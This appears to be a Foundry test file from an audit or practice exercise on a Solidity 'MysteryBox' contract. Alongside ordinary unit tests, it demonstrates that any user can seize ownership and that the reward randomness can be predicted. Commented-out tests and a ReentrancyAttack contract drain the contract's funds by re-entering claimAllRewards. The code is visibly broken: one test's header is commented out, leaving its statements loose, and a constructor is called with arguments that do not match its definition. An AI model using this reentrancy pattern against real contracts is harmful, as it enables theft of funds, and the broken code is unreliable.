// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console2} from "forge-std/Test.sol";
import {console} from "forge-std/Test.sol";
import "forge-std/Test.sol";
import "../src/MysteryBox.sol";

contract MysteryBoxTest is Test {
    MysteryBox public mysteryBox;
    address public owner;
    address public user1;
    address public user2;

    uint256 public boxPrice;


    function setUp() public {
    owner = makeAddr("owner");
    user1 = address(0x1);
    user2 = address(0x2);

    // Ensure `owner` has enough balance to deploy the contract with 0.1 ether.
    vm.deal(owner, 1 ether);

    vm.prank(owner);
    mysteryBox = (new MysteryBox){value: 0.1 ether}();

    console2.log("Reward Pool Length:", mysteryBox.getRewardPool().length);
    }


   
    function testOwnerIsSetCorrectly() public view {
        assertEq(mysteryBox.owner(), owner);
    }

    function testSetBoxPrice() public {
        vm.prank(owner);
        uint256 newPrice = 0.1 ether;
        mysteryBox.setBoxPrice(newPrice);
        assertEq(mysteryBox.boxPrice(), newPrice);
    }

    function testSetBoxPrice_NotOwner() public {
        vm.prank(user1);
        vm.expectRevert("Only owner can set price");
        mysteryBox.setBoxPrice(0.5 ether);
    }

    function testAddReward() public {
        vm.prank(owner);
        mysteryBox.addReward("Diamond Coin", 2 ether);
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewardPool();
        assertEq(rewards.length, 5);
        assertEq(rewards[3].name, "Diamond Coin");
        assertEq(rewards[3].value, 2 ether);
    }

    function testAddReward_NotOwner() public {
        vm.prank(user1);
        vm.expectRevert("Only owner can add rewards");
        mysteryBox.addReward("Diamond Coin", 2 ether);
    }

    function testBuyBox() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        assertEq(mysteryBox.boxesOwned(user1), 1);
    }

    function testBuyBox_IncorrectETH() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        vm.expectRevert("Incorrect ETH sent");
        mysteryBox.buyBox{value: 0.05 ether}();
    }

    function testOpenBox() public {
        vm.deal(user1, 0.5 ether);
        vm.prank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        console.log("Before Open:", mysteryBox.boxesOwned(user1));
        vm.prank(user1);
        mysteryBox.openBox();
        console.log("After Open:", mysteryBox.boxesOwned(user1));
        assertEq(mysteryBox.boxesOwned(user1), 0);

        vm.prank(user1);
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        console2.log(rewards[0].name);
        assertEq(rewards.length, 1);
    }

    function testOpenBox_NoBoxes() public {
        vm.prank(user1);
        vm.expectRevert("No boxes to open");
        mysteryBox.openBox();
    }

    function testTransferReward_InvalidIndex() public {
        vm.prank(user1);
        vm.expectRevert("Invalid index");
        mysteryBox.transferReward(user2, 0);
    }

    function testWithdrawFunds() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();

        uint256 ownerBalanceBefore = owner.balance;
        console.log("Owner Balance Before:", ownerBalanceBefore);
        vm.prank(owner);
        mysteryBox.withdrawFunds();
        uint256 ownerBalanceAfter = owner.balance;
        console.log("Owner Balance After:", ownerBalanceAfter);

        assertEq(ownerBalanceAfter - ownerBalanceBefore, 0.1 ether);
    }

    function testWithdrawFunds_NotOwner() public {
        vm.prank(user1);
        vm.expectRevert("Only owner can withdraw");
        mysteryBox.withdrawFunds();
    }

    function testChangeOwner() public {
        mysteryBox.changeOwner(user1);
        assertEq(mysteryBox.owner(), user1);
    }

    function testChangeOwner_AccessControl() public {
        vm.prank(user1);
        mysteryBox.changeOwner(user1);
        assertEq(mysteryBox.owner(), user1);
    }

    function testAnyoneChangesOwner() public {

        vm.prank (user1);

        mysteryBox.changeOwner(user1);

        console.logBool(mysteryBox.owner() == address(owner));
        console.log("This is the address of user1:", user1);
        console.log("This is the address of actual owner:", owner);

        // the data below is the data after user1 has changed the owner to user1 address.
        console.log("The data below represents the the data after user1 has changed the owner to user1 address");
        
        console.log("Initial owner: ", address(owner));
        console.log("New owner: ", mysteryBox.owner());
    } 

    // function testReentrancyInClaimAllRewards() public{
    //     ReentrancyAttack attacker = new ReentrancyAttack(address(mysteryBox));
        
    //     vm.deal(address(attacker), 0.5 ether);

    //     console.log("Balance of the MysterBox after before:", address(owner).balance);
    //     console.log("Balance of the attacker after before:", address(attacker).balance);

    //     // Prank as the attacker and set up rewards
    //     vm.startPrank(address(attacker));

    //     mysteryBox.buyBox{value: 0.1 ether}();
    //     mysteryBox.openBox();

    //     mysteryBox.buyBox{value: 0.1 ether}();
    //     mysteryBox.openBox();

    //     vm.stopPrank();

    //     // Check if the attacker has rewards to claim
    //    if (mysteryBox.getRewards().length == 0) {
    //      console.log("No rewards generated. Adding rewards manually...");
    //      vm.startPrank(address(mysteryBox.owner()));
    //      mysteryBox.addReward("Silver Coin", 0.5 ether);
    //      mysteryBox.addReward("Gold Coin", 1 ether);
    //      vm.stopPrank();
         
    //     }

    //     // Execute the attack
    //     attacker.attack();

    //     console.log("Balance of the MysterBox after attack:", address(owner).balance);
    //     console.log("Balance of the attacker after attack:", address(attacker).balance);

    //    // Validate the outcome
    //    assertGt(address(attacker).balance, 0.5 ether); // Expect attacker to have stolen funds
    //    assertEq(address(mysteryBox).balance, 0);    // Contract should be drained
    // }

//  function testReentrancyInClaimAllRewards() public {

//     vm.deal (address(owner), 1 ether);
//     vm.prank(owner);
//     uint256 newPrice = 0.1 ether;
//     mysteryBox.setBoxPrice(newPrice);

//     ReentrancyAttack attacker = new ReentrancyAttack(address(mysteryBox));


//     address sender = address(attacker);
//     // Fund the attacker with ETH for testing
    
//     vm.deal(address(attacker), 0.5 ether);

//     console.log("Balance of MysteryBox before attack:", address(mysteryBox).balance);
//     console.log("Balance of attacker before attack:", address(attacker).balance);

//     // Simulate the attacker interacting with the MysteryBox contract
//     vm.startPrank(address(attacker));

//     // Attacker buys and opens boxes, which will generate rewards
//     attacker.buyBox{value: newPrice}();
//     attacker.openBox();


//     vm.stopPrank();  // End the prank

//     // Check if the attacker has rewards to claim
//     if (mysteryBox.getRewards().length == 0) {
//         console.log("No rewards generated. Adding rewards manually...");
//         // Add rewards to the contract to ensure there are rewards to claim
//         vm.startPrank(owner);  // Only the owner can add rewards
//         mysteryBox.addReward("Silver Coin", 0.5 ether);
//         mysteryBox.addReward("Gold Coin", 1 ether);
//         vm.stopPrank();
//     }

//     // Execute the attack
//     vm.startPrank(address(attacker));
//     attacker.attack();  // The attacker calls the claimAllRewards function

//     vm.stopPrank();

//     console.log("Balance of MysteryBox after attack:", address(mysteryBox).balance);
//     console.log("Balance of attacker after attack:", address(attacker).balance);

//     // Validate the outcome
//     assertGt(address(attacker).balance, 0.5 ether);  // Expect attacker to have stolen funds
//     assertEq(address(mysteryBox).balance, 0);       // Contract should be drained
    
//     }



// }

// function testReentrancyInClaimAllRewards() public {
        vm.prank(address(0x6969));
        ReentrancyAttack attacker = new ReentrancyAttack(address(mysteryBox), msg.sender);

        uint256 timestamp = block.timestamp;
        address sender = address(attacker);
        uint256 predictedRandom = uint256(keccak256(abi.encodePacked(timestamp, sender))) % 100;
        console.log("winning number:", predictedRandom);
        vm.deal(address(mysteryBox), 2 ether);
        vm.deal(address(attacker), 0.1 ether);
        attacker.buyBox();
        console.log("Contract balance before attack:", address(mysteryBox).balance);
        console.log("attacker balance before attack:", address(attacker).balance);
        attacker.attack();
        console.log("Contract balance after attack:", address(mysteryBox).balance);
        console.log("attacker balance after attack:", address(attacker).balance);
    }


// contract ReentrancyAttack{
//     MysteryBox public mysteryBox;

//     constructor(address _mysteryBox) {
//         mysteryBox = MysteryBox(_mysteryBox);
//     }

//     function

//     // Initiates the attack
//     function attack() external {
        
//         mysteryBox.claimAllRewards();
//     }

//     // Fallback function to reenter `claimAllRewards`
//     fallback() external payable {
//         if (address(mysteryBox).balance > 0) {
//             mysteryBox.claimAllRewards();
//         }
//     }

//     // Function to receive funds
//     receive() external payable {}
// }

